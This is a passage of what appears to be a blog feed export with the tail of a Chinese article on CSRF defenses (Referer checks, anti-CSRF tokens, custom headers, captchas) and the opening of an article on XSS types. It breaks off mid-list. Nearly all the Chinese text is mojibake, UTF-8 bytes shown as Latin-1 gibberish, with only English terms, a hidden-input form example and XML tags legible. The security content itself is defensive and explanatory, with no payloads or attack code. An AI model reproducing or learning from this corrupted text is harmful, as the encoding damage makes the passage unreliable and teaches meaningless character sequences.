å’Œé€»è¾‘ï¼Œæ²¡æœ‰é£Žé™©ï¼Œéžå¸¸ä¾¿æ·ã€‚ ç„¶è€Œï¼Œè¿™ç§æ–¹æ³•å¹¶éžä¸‡æ— ä¸€å¤±ã€‚Refererçš„å€¼å¯ä»¥æŠ“åŒ…ä¼ªé€ ä¿®æ”¹ï¼Œä½¿å¾—é»‘å®¢å®Œå…¨å¯ä»¥æŠŠç”¨æˆ·æµè§ˆå™¨çš„Refererå€¼è®¾ä¸ºä»¥ bank.example åŸŸåå¼€å¤´çš„åœ°å€ï¼Œè¿™æ ·å°±å¯ä»¥é€šè¿‡éªŒè¯ï¼Œä»Žè€Œè¿›è¡ŒCSRFæ”»å‡»ã€‚ å³ä¾¿é»‘å®¢æ— æ³•ç¯¡æ”¹Refererå€¼ï¼Œè¿™ç§æ–¹æ³•ä»ç„¶æœ‰é—®é¢˜ã€‚å› ä¸º Referer å€¼ä¼šè®°å½•ä¸‹ç”¨æˆ·çš„è®¿é—®æ¥æºï¼Œæœ‰äº›ç”¨æˆ·è®¤ä¸ºè¿™æ ·ä¼šä¾µçŠ¯åˆ°ä»–ä»¬è‡ªå·±çš„éšç§æƒï¼Œç‰¹åˆ«æ˜¯æœ‰äº›ç»„ç»‡æ‹…å¿ƒRefererå€¼ä¼šæŠŠç»„ç»‡å†…ç½‘ä¸­çš„æŸäº›ä¿¡æ¯æ³„éœ²åˆ°å¤–ç½‘ä¸­ã€‚å› æ­¤ï¼Œç”¨æˆ·è‡ªå·±å¯ä»¥è®¾ç½®æµè§ˆå™¨ä½¿å…¶åœ¨å‘é€è¯·æ±‚æ—¶ä¸å†æä¾›Refererã€‚å½“ä»–ä»¬æ­£å¸¸è®¿é—®é“¶è¡Œç½‘ç«™æ—¶ï¼Œç½‘ç«™ä¼šå› ä¸ºè¯·æ±‚æ²¡æœ‰Refererå€¼è€Œè®¤ä¸ºæ˜¯CSRFæ”»å‡»ï¼Œæ‹’ç»åˆæ³•ç”¨æˆ·çš„è®¿é—®ã€‚åœ¨è¯·æ±‚åœ°å€ä¸­æ·»åŠ  token å¹¶éªŒè¯ çŽ°åœ¨ä¸šç•Œå¯¹CSRFçš„é˜²å¾¡ï¼Œä¸€è‡´çš„åšæ³•æ˜¯ä½¿ç”¨ä¸€ä¸ªTokenï¼ˆAnti CSRF Tokenï¼‰ã€‚ CSRFæ”»å‡»ä¹‹æ‰€ä»¥èƒ½å¤ŸæˆåŠŸï¼Œæ˜¯å› ä¸ºé»‘å®¢å¯ä»¥å®Œå…¨ä¼ªé€ ç”¨æˆ·çš„è¯·æ±‚ï¼Œè¯¥è¯·æ±‚ä¸­æ‰€æœ‰çš„ç”¨æˆ·éªŒè¯ä¿¡æ¯éƒ½æ˜¯å­˜åœ¨äºŽcookieä¸­ï¼Œå› æ­¤é»‘å®¢å¯ä»¥åœ¨ä¸çŸ¥é“è¿™äº›éªŒè¯ä¿¡æ¯çš„æƒ…å†µä¸‹ç›´æŽ¥åˆ©ç”¨ç”¨æˆ·è‡ªå·±çš„cookie æ¥é€šè¿‡å®‰å…¨éªŒè¯ã€‚ è¦æŠµå¾¡CSRFï¼Œå…³é”®åœ¨äºŽåœ¨è¯·æ±‚ä¸­æ”¾å…¥é»‘å®¢æ‰€ä¸èƒ½ä¼ªé€ çš„ä¿¡æ¯ï¼Œå¹¶ä¸”è¯¥ä¿¡æ¯ä¸å­˜åœ¨äºŽcookieä¹‹ä¸­ã€‚ å¯ä»¥åœ¨HTTPè¯·æ±‚ä¸­ä»¥å‚æ•°çš„å½¢å¼åŠ å…¥ä¸€ä¸ªéšæœºäº§ç”Ÿçš„tokenï¼Œå¹¶åœ¨æœåŠ¡å™¨ç«¯å»ºç«‹ä¸€ä¸ªæ‹¦æˆªå™¨æ¥éªŒè¯è¿™ä¸ªtokenï¼Œå¦‚æžœè¯·æ±‚ä¸­æ²¡æœ‰tokenæˆ–è€…tokenå†…å®¹ä¸æ­£ç¡®ï¼Œåˆ™è®¤ä¸ºå¯èƒ½æ˜¯CSRFæ”»å‡»è€Œæ‹’ç»è¯¥è¯·æ±‚ã€‚æ¯”å¦‚ï¼š1ã€ç”¨æˆ·è®¿é—®æŸä¸ªè¡¨å•é¡µé¢ã€‚2ã€ æœåŠ¡ç«¯ç”Ÿæˆä¸€ä¸ªTokenï¼Œæ”¾åœ¨ç”¨æˆ·çš„Sessionä¸­ï¼Œæˆ–è€…æµè§ˆå™¨çš„Cookieä¸­ã€‚3ã€åœ¨é¡µé¢è¡¨å•é™„å¸¦ä¸ŠTokenå‚æ•°ã€‚4ã€ç”¨æˆ·æäº¤è¯·æ±‚åŽï¼Œ æœåŠ¡ç«¯éªŒè¯è¡¨å•ä¸­çš„Tokenæ˜¯å¦ä¸Žç”¨æˆ·Sessionï¼ˆæˆ–Cookiesï¼‰ä¸­çš„Tokenä¸€è‡´ï¼Œä¸€è‡´ä¸ºåˆæ³•è¯·æ±‚ï¼Œä¸æ˜¯åˆ™éžæ³•è¯·æ±‚ã€‚ è¿™ç§æ–¹æ³•è¦æ¯”æ£€æŸ¥Refererè¦å®‰å…¨ä¸€äº›ï¼Œtokenå¯ä»¥åœ¨ç”¨æˆ·ç™»é™†åŽäº§ç”Ÿå¹¶æ”¾äºŽsessionä¹‹ä¸­ï¼Œç„¶åŽåœ¨æ¯æ¬¡è¯·æ±‚æ—¶æŠŠtokenä»Žsessionä¸­æ‹¿å‡ºï¼Œä¸Žè¯·æ±‚ä¸­çš„tokenè¿›è¡Œæ¯”å¯¹ã€‚tokençš„å€¼å¿…é¡»æ˜¯éšæœºçš„ï¼Œä¸å¯é¢„æµ‹çš„ã€‚æœ‰äº†tokençš„å­˜åœ¨ï¼Œæ”»å‡»è€…æ— æ³•å†æž„é€ ä¸€ä¸ªå¸¦æœ‰åˆæ³•tokençš„è¯·æ±‚å®žæ–½CSRFæ”»å‡»ã€‚å¦å¤–ä½¿ç”¨tokenæ—¶åº”æ³¨æ„tokençš„ä¿å¯†æ€§ï¼Œå°½é‡æŠŠæ•æ„Ÿæ“ä½œç”±GETæ”¹ä¸ºPOSTï¼Œä»¥formæˆ–AJAXå½¢å¼æäº¤ï¼Œé¿å…tokenæ³„éœ²ã€‚ä½†è¿™ç§æ–¹æ³•çš„éš¾ç‚¹åœ¨äºŽå¦‚ä½•æŠŠtokenä»¥å‚æ•°çš„å½¢å¼åŠ å…¥è¯·æ±‚ã€‚ å¯¹äºŽGETè¯·æ±‚ï¼Œtokenå°†é™„åœ¨è¯·æ±‚åœ°å€ä¹‹åŽï¼Œè¿™æ ·URLå°±å˜æˆ http://url?csrftoken=tokenvalueã€‚ è€Œå¯¹äºŽPOSTè¯·æ±‚æ¥è¯´ï¼Œè¦åœ¨formçš„æœ€åŽåŠ ä¸Š &lt;input type=&quot;hidden&quot; name=&quot;csrftoken&quot; value=&quot;tokenvalue&quot;/&gt;ï¼Œè¿™æ ·å°±æŠŠtokenä»¥å‚æ•°çš„å½¢å¼åŠ å…¥è¯·æ±‚äº†ã€‚ ä½†æ˜¯ï¼Œåœ¨ä¸€ä¸ªç½‘ç«™ä¸­ï¼Œå¯ä»¥æŽ¥å—è¯·æ±‚çš„åœ°æ–¹éžå¸¸å¤šï¼Œè¦å¯¹äºŽæ¯ä¸€ä¸ªè¯·æ±‚éƒ½åŠ ä¸Štokenæ˜¯å¾ˆéº»çƒ¦çš„ï¼Œå¹¶ä¸”å¾ˆå®¹æ˜“æ¼æŽ‰ï¼Œé€šå¸¸ä½¿ç”¨çš„æ–¹æ³•å°±æ˜¯åœ¨æ¯æ¬¡é¡µé¢åŠ è½½æ—¶ï¼Œä½¿ç”¨javascriptéåŽ†æ•´ä¸ªdomæ ‘ï¼Œå¯¹äºŽdomä¸­æ‰€æœ‰çš„aå’Œformæ ‡ç­¾åŽåŠ å…¥tokenã€‚è¿™æ ·å¯ä»¥è§£å†³å¤§éƒ¨åˆ†çš„è¯·æ±‚ï¼Œä½†æ˜¯å¯¹äºŽåœ¨é¡µé¢åŠ è½½ä¹‹åŽåŠ¨æ€ç”Ÿæˆçš„htmlä»£ç ï¼Œè¿™ç§æ–¹æ³•å°±æ²¡æœ‰ä½œç”¨ï¼Œè¿˜éœ€è¦ç¨‹åºå‘˜åœ¨ç¼–ç æ—¶æ‰‹åŠ¨æ·»åŠ tokenã€‚ è¯¥æ–¹æ³•è¿˜æœ‰ä¸€ä¸ªç¼ºç‚¹æ˜¯éš¾ä»¥ä¿è¯tokenæœ¬èº«çš„å®‰å…¨ã€‚ç‰¹åˆ«æ˜¯åœ¨ä¸€äº›è®ºå›ä¹‹ç±»æ”¯æŒç”¨æˆ·è‡ªå·±å‘è¡¨å†…å®¹çš„ç½‘ç«™ï¼Œé»‘å®¢å¯ä»¥åœ¨ä¸Šé¢å‘å¸ƒè‡ªå·±ä¸ªäººç½‘ç«™çš„åœ°å€ã€‚ç”±äºŽç³»ç»Ÿä¹Ÿä¼šåœ¨è¿™ä¸ªåœ°å€åŽé¢åŠ ä¸Štokenï¼Œé»‘å®¢å¯ä»¥åœ¨è‡ªå·±çš„ç½‘ç«™ä¸Šå¾—åˆ°è¿™ä¸ªtokenï¼Œå¹¶é©¬ä¸Šå°±å¯ä»¥å‘åŠ¨ CSRF æ”»å‡»ã€‚ä¸ºäº†é¿å…è¿™ä¸€ç‚¹ï¼Œç³»ç»Ÿå¯ä»¥åœ¨æ·»åŠ tokençš„æ—¶å€™å¢žåŠ ä¸€ä¸ªåˆ¤æ–­ï¼Œå¦‚æžœè¿™ä¸ªé“¾æŽ¥æ˜¯æŒ‡å‘è‡ªå·±ç½‘ç«™çš„ï¼Œå°±åœ¨åŽé¢æ·»åŠ tokenï¼Œå¦‚æžœæ˜¯é€šå‘å…¶ä»–çš„åˆ™ä¸åŠ ã€‚ä¸è¿‡ï¼Œå³ä½¿è¿™ä¸ªcsrftokenä¸ä»¥å‚æ•°çš„å½¢å¼é™„åŠ åœ¨è¯·æ±‚ä¹‹ä¸­ï¼Œé»‘å®¢çš„ç½‘ç«™ä¹ŸåŒæ ·å¯ä»¥é€šè¿‡Refereræ¥å¾—åˆ°è¿™ä¸ªtokenå€¼ä»¥å‘åŠ¨CSRFæ”»å‡»ã€‚è¿™ä¹Ÿæ˜¯ä¸€äº›ç”¨æˆ·å–œæ¬¢æ‰‹åŠ¨å…³é—­æµè§ˆå™¨RefereråŠŸèƒ½çš„åŽŸå› ã€‚åœ¨ HTTP å¤´ä¸­è‡ªå®šä¹‰å±žæ€§å¹¶éªŒè¯ è¿™ç§æ–¹æ³•ä¹Ÿæ˜¯ä½¿ç”¨tokenå¹¶è¿›è¡ŒéªŒè¯ï¼Œå’Œä¸Šä¸€ç§æ–¹æ³•ä¸åŒçš„æ˜¯ï¼Œè¿™é‡Œå¹¶ä¸æ˜¯æŠŠtokenä»¥å‚æ•°çš„å½¢å¼ç½®äºŽHTTPè¯·æ±‚ä¹‹ä¸­ï¼Œè€Œæ˜¯æŠŠå®ƒæ”¾åˆ°HTTPå¤´ä¸­è‡ªå®šä¹‰çš„å±žæ€§é‡Œã€‚é€šè¿‡XMLHttpRequestè¿™ä¸ªç±»ï¼Œå¯ä»¥ä¸€æ¬¡æ€§ç»™æ‰€æœ‰è¯¥ç±»è¯·æ±‚åŠ ä¸Šcsrftokenè¿™ä¸ªHTTPå¤´å±žæ€§ï¼Œå¹¶æŠŠtokenå€¼æ”¾å…¥å…¶ä¸­ã€‚è¿™æ ·è§£å†³äº†ä¸Šç§æ–¹æ³•åœ¨è¯·æ±‚ä¸­åŠ å…¥tokençš„ä¸ä¾¿ï¼ŒåŒæ—¶ï¼Œé€šè¿‡XMLHttpRequestè¯·æ±‚çš„åœ°å€ä¸ä¼šè¢«è®°å½•åˆ°æµè§ˆå™¨çš„åœ°å€æ ï¼Œä¹Ÿä¸ç”¨æ‹…å¿ƒtokenä¼šé€è¿‡Refereræ³„éœ²åˆ°å…¶ä»–ç½‘ç«™ä¸­åŽ»ã€‚ ç„¶è€Œè¿™ç§æ–¹æ³•çš„å±€é™æ€§éžå¸¸å¤§ã€‚XMLHttpRequest è¯·æ±‚é€šå¸¸ç”¨äºŽAjaxæ–¹æ³•ä¸­å¯¹äºŽé¡µé¢å±€éƒ¨çš„å¼‚æ­¥åˆ·æ–°ï¼Œå¹¶éžæ‰€æœ‰çš„è¯·æ±‚éƒ½é€‚åˆç”¨è¿™ä¸ªç±»æ¥å‘èµ·ï¼Œè€Œä¸”é€šè¿‡è¯¥ç±»è¯·æ±‚å¾—åˆ°çš„é¡µé¢ä¸èƒ½è¢«æµè§ˆå™¨æ‰€è®°å½•ä¸‹ï¼Œä»Žè€Œè¿›è¡Œå‰è¿›ï¼ŒåŽé€€ï¼Œåˆ·æ–°ï¼Œæ”¶è—ç­‰æ“ä½œï¼Œç»™ç”¨æˆ·å¸¦æ¥ä¸ä¾¿ã€‚å¦å¤–ï¼Œå¯¹äºŽæ²¡æœ‰è¿›è¡ŒCSRFé˜²æŠ¤çš„é—ç•™ç³»ç»Ÿæ¥è¯´ï¼Œè¦é‡‡ç”¨è¿™ç§æ–¹æ³•æ¥è¿›è¡Œé˜²æŠ¤ï¼Œè¦æŠŠæ‰€æœ‰è¯·æ±‚éƒ½æ”¹ä¸ºXMLHttpRequestè¯·æ±‚ï¼Œè¿™æ ·å‡ ä¹Žæ˜¯è¦é‡å†™æ•´ä¸ªç½‘ç«™ï¼Œè¿™ä»£ä»·æ— ç–‘æ˜¯ä¸èƒ½æŽ¥å—çš„ã€‚é™¤äº†ä»¥ä¸Šçš„ä¸‰ç§ä¸»è¦é˜²å¾¡CSRFæ”»å‡»çš„ç­–ç•¥ä¹‹å¤–ï¼Œè¿˜æœ‰ä»¥ä¸‹å‡ ç§é˜²å¾¡æŽªæ–½ðŸ‘‡å°½é‡ä½¿ç”¨POSTï¼Œé™åˆ¶GET GETæŽ¥å£å¤ªå®¹æ˜“è¢«æ‹¿æ¥åšCSRFæ”»å‡»ï¼Œçœ‹ç¬¬ä¸€ä¸ªç¤ºä¾‹å°±çŸ¥é“ï¼Œåªè¦æž„é€ ä¸€ä¸ªimgæ ‡ç­¾ï¼Œè€Œimgæ ‡ç­¾åˆæ˜¯ä¸èƒ½è¿‡æ»¤çš„æ•°æ®ã€‚ æŽ¥å£æœ€å¥½é™åˆ¶ä¸ºPOSTä½¿ç”¨ï¼ŒGETåˆ™æ— æ•ˆï¼Œé™ä½Žæ”»å‡»é£Žé™©ã€‚ å½“ç„¶POSTå¹¶ä¸æ˜¯ä¸‡æ— ä¸€å¤±ï¼Œæ”»å‡»è€…åªè¦æž„é€ ä¸€ä¸ªformå°±å¯ä»¥ï¼Œä½†éœ€è¦åœ¨ç¬¬ä¸‰æ–¹é¡µé¢åšï¼Œè¿™æ ·å°±å¢žåŠ æš´éœ²çš„å¯èƒ½æ€§ã€‚æµè§ˆå™¨Cookieç­–ç•¥ IE6ã€7ã€8ã€Safariä¼šé»˜è®¤æ‹¦æˆªç¬¬ä¸‰æ–¹æœ¬åœ°Cookieï¼ˆThird-party Cookieï¼‰çš„å‘é€ã€‚ ä½†æ˜¯Firefox2ã€3ã€Operaã€Chromeã€Androidç­‰ä¸ä¼šæ‹¦æˆªï¼Œæ‰€ä»¥é€šè¿‡æµè§ˆå™¨Cookieç­–ç•¥æ¥é˜²å¾¡CSRFæ”»å‡»ä¸é è°±ï¼Œåªèƒ½è¯´æ˜¯é™ä½Žäº†é£Žé™©ã€‚Cookieåˆ†ä¸ºä¸¤ç§ï¼šSession Cookieï¼ˆåœ¨æµè§ˆå™¨å…³é—­åŽï¼Œå°±ä¼šå¤±æ•ˆï¼Œä¿å­˜åˆ°å†…å­˜é‡Œï¼‰Third-party Cookieï¼ˆå³åªæœ‰åˆ°äº†Exprieæ—¶é—´åŽæ‰ä¼šå¤±æ•ˆçš„Cookieï¼Œè¿™ç§Cookieä¼šä¿å­˜åˆ°æœ¬åœ°ï¼‰ å¦å¤–å¦‚æžœç½‘ç«™è¿”å›žHTTPå¤´åŒ…å«P3P Headerï¼Œé‚£ä¹ˆå°†å…è®¸æµè§ˆå™¨å‘é€ç¬¬ä¸‰æ–¹Cookieã€‚åŠ éªŒè¯ç  éªŒè¯ç ï¼Œå¼ºåˆ¶ç”¨æˆ·å¿…é¡»ä¸Žåº”ç”¨è¿›è¡Œäº¤äº’ï¼Œæ‰èƒ½å®Œæˆæœ€ç»ˆè¯·æ±‚ã€‚åœ¨é€šå¸¸æƒ…å†µä¸‹ï¼ŒéªŒè¯ç èƒ½å¾ˆå¥½éåˆ¶CSRFæ”»å‡»ã€‚ ä½†æ˜¯å‡ºäºŽç”¨æˆ·ä½“éªŒè€ƒè™‘ï¼Œç½‘ç«™ä¸èƒ½ç»™æ‰€æœ‰çš„æ“ä½œéƒ½åŠ ä¸ŠéªŒè¯ç ã€‚å› æ­¤éªŒè¯ç åªèƒ½ä½œä¸ºä¸€ç§è¾…åŠ©æ‰‹æ®µï¼Œä¸èƒ½ä½œä¸ºä¸»è¦è§£å†³æ–¹æ¡ˆã€‚CSRFä¸ŽXSSçš„åŒºåˆ«âœŒ1ã€XSSæ˜¯ç›—å–ç”¨æˆ·cookieï¼Œä»Žè€Œè¿›ä¸€æ­¥æ”»å‡»ï¼ŒCSRFç›´æŽ¥å®Œæˆå¯¹å—ä¿¡ä»»ç½‘ç«™çš„æ”»å‡»ï¼› XSSæ”»å‡»æ¡ä»¶æ¯”CSRFè¦ç®€å•ï¼Œå®ŒæˆCSRFæ”»å‡»è¦è¯¸å¤šæ¡ä»¶ï¼›3ã€XSSæ˜¯å®žçŽ°CSRFè¯¸å¤šæ¡ä»¶çš„ä¸€ç§ï¼Œè¿™æ ·çš„ç»“åˆç§°ä¸ºXSRFï¼›4ã€XSSæ”»å‡»å¾ˆå¤šæ—¶å€™æ˜¯èŽ·å–ä¿¡æ¯ï¼Œä¸éœ€è¦æå‰çŸ¥é“å…¶ä»–ç”¨æˆ·é¡µé¢çš„ä»£ç å’Œæ•°æ®åŒ…ã€‚CSRFæ˜¯ä»£æ›¿ç”¨æˆ·å®ŒæˆæŒ‡å®šçš„åŠ¨ä½œï¼ˆç›´æŽ¥å®Œæˆæ”»å‡»ç›®æ ‡ï¼‰ï¼Œéœ€è¦æž„é€ å‡ºç›®æ ‡ç½‘ç«™çš„URLç»“æž„ã€‚ XSSæ˜¯æ”»å‡»è€…å·äº†ä½ è½¦çš„é’¥åŒ™åŽï¼Œç”¨ä½ çš„é’¥åŒ™è¿›å…¥åˆ°ä½ è½¦ï¼Œå¼€ä½ çš„è½¦ã€‚ CSRFæ˜¯è®©ä½ è‡ªå·±ç”¨é’¥åŒ™å¼€é—¨åŽï¼Œå¸®åŠ©æ”»å‡»è€…å¼€äº†ä½ çš„è½¦ï¼Œå¹¶ä¸”ä½ æ²¡æœ‰æ„è¯†åˆ°è¿™ä¸ªæ“ä½œã€‚å‚è€ƒèµ„æ–™å¸¦ä½ å¿«é€Ÿäº†è§£CSRFæ”»å‡»ä¸Žé˜²å¾¡å®‰å…¨|å¸¸è§çš„Webæ”»å‡»æ‰‹æ®µä¹‹CSRFæ”»å‡»CSRFæ”»å‡»ä¸Žé˜²å¾¡]]></content>
      <categories>
        <category>webå®‰å…¨</category>
      </categories>
      <tags>
        <tag>CSRF</tag>
        <tag>è·¨ç«™åŸŸè¯·æ±‚ä¼ªé€ æ”»å‡»</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSSçš„æ”»å‡»åŽŸç†ä¸Žé˜²å¾¡åŽŸç†]]></title>
    <url>%2Fposts%2F9ee0c5.html%2F</url>
    <content type="text"><![CDATA[è¿Ÿæ—¥æ±Ÿå±±ä¸½ï¼Œæ˜¥é£ŽèŠ±è‰é¦™ xssåˆç§°è·¨ç«™è„šæœ¬æ”»å‡»ï¼ŒåŽŸç§°ä¸ºcssï¼ˆCross-Site Scriptingï¼‰ï¼Œå› ä¸ºå’Œå±‚å æ ·å¼è¡¨(Cascading Style Sheets)é‡åï¼Œæ‰€ä»¥åˆç§°ä¸ºxss(xä¸€èˆ¬æœ‰æœªçŸ¥çš„å«ä¹‰ï¼Œè¿˜æœ‰æ‰©å±•çš„å«ä¹‰)ã€‚XSSçš„æ”»å‡»åŽŸç† xssæ”»å‡»æ¶‰åŠåˆ°äº†æ”»å‡»è€…ï¼Œç”¨æˆ·å’Œweb serverã€‚ä¸»è¦æ˜¯åˆ©ç”¨äº†ç½‘ç«™æœ¬èº«è®¾è®¡çš„ä¸ä¸¥è°¨æ€§ï¼Œæ”»å‡»è€…é€šè¿‡å¯¹ç½‘é¡µæ’å…¥æ¶æ„çš„æ”»å‡»è„šæœ¬ï¼Œå¯¼è‡´å½“ç”¨æˆ·åœ¨æµè§ˆç½‘é¡µçš„æ—¶å€™ï¼ŒåµŒå…¥å…¶ä¸­çš„æ”»å‡»è„šæœ¬å°±ä¼šè¢«æ‰§è¡Œï¼Œä»Žè€Œè¾¾åˆ°æ¶æ„æ”»å‡»ç”¨æˆ·çš„ç‰¹æ®Šç›®çš„ã€‚æ”»å‡»è€…é€šè¿‡xssæ”»å‡»ï¼Œå¯ä»¥èŽ·å–åˆ°ç”¨æˆ·çš„cookieï¼Œç„¶åŽå‘é€ç»™æ”»å‡»è€…æƒ³è¦æ”»å‡»çš„ç½‘ç«™ï¼Œå› ä¸ºè·¨ç«™äº†ï¼Œæ‰€ä»¥ä¹Ÿç§°ä¸ºè·¨ç«™è„šæœ¬æ”»å‡»ã€‚XSSçš„åˆ†ç±» æ ¹æ®æ”»å‡»çš„æ¥æºï¼Œxssæ”»å‡»çš„åˆ†ç±»ä¸»è¦åˆ†ä¸ºï¼šåå°„åž‹xssã€å­˜å‚¨åž‹xsså’ŒDOMåž‹xssä¸‰ç§ã€‚åå°„åž‹xss åå°„åž‹xssï¼Œä¹Ÿå«â€œéžæŒä¹…åž‹xssâ€ã€‚ç”¨æˆ·ç‚¹å‡»æ”»å‡»é“¾æŽ¥ï¼Œè§¦å‘äº†æ¶æ„è„šæœ¬ï¼ŒæœåŠ¡å™¨è§£æžåŽå“åº”ï¼Œåœ¨è¿”å›žçš„å“åº”å†…å®¹ä¸­å‡ºçŽ°æ”»å‡»è€…çš„xssä»£ç ï¼Œè¢«æµè§ˆå™¨æ‰§è¡Œã€‚ä¸€æ¥ä¸€åŽ»ï¼Œxssæ”»å‡»è„šæœ¬è¢«web serveråå°„å›žæ¥ç»™æµè§ˆå™¨æ‰§è¡Œï¼Œæ‰€ä»¥ç§°ä¸ºåå°„åž‹xssã€‚åå°„åž‹xssçš„æ”»å‡»æ­¥éª¤ï¼š 1ã€æ”»å‡»è€…æž„é€ å‡ºç‰¹æ®Šçš„URLï¼Œå…¶ä¸­åŒ…å«æ¶æ„ä»£ç ï¼› 2ã€ç”¨æˆ·æ‰“å¼€å¸¦æœ‰æ¶æ„ä»£ç çš„URLæ—¶ï¼Œç½‘ç«™æœåŠ¡ç«¯å°†æ¶æ„ä»£ç ä»ŽURLä¸­å–å‡ºï¼Œæ‹¼æŽ¥åœ¨HTMLä¸­è¿”å›žç»™æµè§ˆå™¨ï¼› 3ã€ç”¨æˆ·æµè§ˆå™¨æŽ¥æ”¶åˆ°å“åº”åŽè§£æžæ‰§è¡Œï¼Œæ··åœ¨å…¶ä¸­çš„æ¶æ„ä»£ç ä¹Ÿè¢«æ‰§è¡Œï¼› 4ã€æ¶æ„ä»£ç çªƒå–ç”¨æˆ·æ•°æ®å¹¶å‘é€åˆ°æ”»å‡»è€…çš„ç½‘ç«™ï¼Œæˆ–è€…å†’å……ç”¨æˆ·çš„è¡Œä¸ºï¼Œè°ƒç”¨ç›®æ ‡ç½‘ç«™æŽ¥å£æ‰§è¡Œæ”»å‡»è€…æŒ‡å®šçš„æ“ä½œã€‚ç‰¹ç‚¹ï¼š 1ã€æ”»å‡»è„šæœ¬éžæŒä¹…æ€§ï¼Œæ²¡æœ‰ä¿å­˜åœ¨web serverä¸­ï¼Œè€Œæ˜¯ç›´æŽ¥å‡ºçŽ°åœ¨äº†URLåœ°å€ä¸­ï¼› 2ã€åå°„åž‹xssæ¼æ´žå¸¸è§äºŽé€šè¿‡URLä¼ é€’å‚æ•°çš„åŠŸèƒ½ï¼Œå¦‚ç½‘ç«™æœç´¢ã€è·³è½¬ç­‰ï¼› 3ã€ç”±äºŽéœ€è¦ç”¨æˆ·ä¸»åŠ¨æ‰“å¼€æ¶æ„çš„URLæ‰èƒ½ç”Ÿæ•ˆï¼Œæ”»å‡»è€…å¾€å¾€ä¼šç»“åˆå¤šç§æ‰‹æ®µè¯±å¯¼ç”¨æˆ·ç‚¹å‡»ã€‚ä¸€èˆ¬é€šè¿‡é‚®ä»¶ã€ç¤¾äº¤è½¯ä»¶ç­‰æ–¹å¼ç›´æŽ¥å‘é€æ”»å‡»URLï¼Œé€šè¿‡ç”¨æˆ·çš„ç‚¹å‡»æ¥è¾¾åˆ°æ”»å‡»ç›®çš„çš„ã€‚ POSTçš„å†…å®¹ä¹Ÿå¯ä»¥è§¦å‘åå°„åž‹xssï¼Œåªä¸è¿‡å…¶è§¦å‘æ¡ä»¶æ¯”è¾ƒè‹›åˆ»ï¼Œéœ€è¦æž„é€ è¡¨å•æäº¤é¡µé¢ï¼Œå¹¶å¼•å¯¼ç”¨æˆ·ç‚¹å‡»ï¼Œæ‰€ä»¥éžå¸¸å°‘è§ã€‚å­˜å‚¨åž‹xss å­˜å‚¨åž‹xssï¼Œä¹Ÿå«â€œæŒä¹…åž‹xssâ€ï¼Œç›¸æ¯”åå°„åž‹xssï¼Œå­˜å‚¨åž‹xssæ˜¯æŠŠæ¶æ„è„šæœ¬ä¿å­˜åˆ°äº†web serverä¸­çš„ï¼Œè¿™ç§æ”»å‡»å…·æœ‰è¾ƒå¼ºçš„ç¨³å®šæ€§å’ŒæŒä¹…æ€§ï¼Œå±å®³æ€§ä¹Ÿæ›´å¤§ã€‚è¿™æ ·æ¯ä¸€ä¸ªè®¿é—®ç‰¹å®šç½‘é¡µçš„ç”¨æˆ·ï¼Œéƒ½ä¼šå—åˆ°æ”»å‡»ã€‚å­˜å‚¨åž‹xssçš„æ”»å‡»æ­¥éª¤ï¼š 1ã€æ”»å‡»è€…å°†æ¶æ„ä»£ç æäº¤åˆ°ç›®æ ‡ç½‘ç«™çš„æ•°æ®åº“ä¸­ï¼› 2ã€ç”¨æˆ·æ‰“å¼€ç›®æ ‡ç½‘ç«™æ—¶ï¼Œç½‘ç«™æœåŠ¡ç«¯å°†æ¶æ„ä»£ç ä»Žæ•°æ®åº“å–å‡ºï¼Œæ‹¼æŽ¥åœ¨HTMLä¸­è¿”å›žç»™æµè§ˆå™¨ï¼› 3ã€ç”¨æˆ·æµè§ˆå™¨æŽ¥æ”¶åˆ°å“åº”åŽè§£æžæ‰§è¡Œï¼Œæ··åœ¨å…¶ä¸­çš„æ¶æ„ä»£ç ä¹Ÿè¢«æ‰§è¡Œï¼› 4ã€æ¶æ„ä»£ç çªƒå–ç”¨æˆ·æ•°æ®å¹¶å‘é€åˆ°æ”»å‡»è€…çš„ç½‘ç«™ï¼Œæˆ–è€…å†’å……ç”¨æˆ·çš„è¡Œä¸ºï¼Œè°ƒç”¨ç›®æ ‡ç½‘ç«™æŽ¥å£æ‰§è¡Œæ”»å‡»è€…æŒ‡å®šçš„æ“ä½œã€‚ç‰¹ç‚¹ï¼š 1ã€æ”»å‡»è„šæœ¬æŒä¹…æ€§ï¼Œä¿å­˜åœ¨web serverä¸­ï¼› 2ã€è¿™ç§æ”»å‡»å¸¸è§äºŽå¸¦æœ‰ç”¨æˆ·ä¿å­˜æ•°æ®çš„ç½‘ç«™åŠŸèƒ½ï¼Œä¸€èˆ¬é€šè¿‡è®ºå›å‘å¸–ã€å•†å“è¯„è®ºã€ç”¨æˆ·ç§ä¿¡ç­‰åŠŸèƒ½ï¼ˆæ‰€æœ‰èƒ½å¤Ÿå‘web serverè¾“å…¥å†…å®¹çš„åœ°æ–¹ï¼‰ï¼Œå°†æ”»å‡»è„šæœ¬å­˜å‚¨åˆ°web serverä¸­ã€‚ æœ‰æ—¶å€™åå°„åž‹xsså’Œå­˜å‚¨åž‹xssæ˜¯åŒæ—¶ä½¿ç”¨çš„ï¼Œæ¯”å¦‚ï¼šå…ˆé€šè¿‡å¯¹ä¸€ä¸ªæ”»å‡»urlè¿›è¡Œç¼–ç ï¼ˆæ¥ç»•è¿‡xss filterï¼‰ï¼Œæäº¤åˆ°web serverï¼ˆå­˜å‚¨åœ¨web serverä¸­ï¼‰ï¼Œç„¶åŽç”¨æˆ·åœ¨æµè§ˆé¡µé¢æ—¶ï¼Œå¦‚æžœç‚¹å‡»è¯¥urlï¼Œå°±ä¼šè§¦å‘ä¸€ä¸ªxssæ”»å‡»ã€‚å½“ç„¶ç”¨æˆ·ç‚¹å‡»è¯¥urlæ—¶ï¼Œä¹Ÿå¯èƒ½ä¼šè§¦å‘ä¸€ä¸ªCSRFï¼ˆCross site request forgeryï¼‰æ”»å‡»ã€‚DOMåž‹xss DOMï¼ˆDocument Object Modelï¼‰ â€“based æ¼æ´žæ˜¯åŸºäºŽæ–‡æ¡£å¯¹è±¡æ¨¡åž‹çš„ä¸€ç§æ¼æ´žï¼Œé€šè¿‡ä¿®æ”¹é¡µé¢çš„DOMèŠ‚ç‚¹è€Œå½¢æˆçš„xssæ¼æ´žã€‚DOMåž‹xssçš„æ”»å‡»æ­¥éª¤ï¼š 1ã€æ”»å‡»è€…æž„é€ å‡ºç‰¹æ®Šçš„URLï¼Œå…¶ä¸­åŒ…å«æ¶æ„ä»£ç ã€‚ 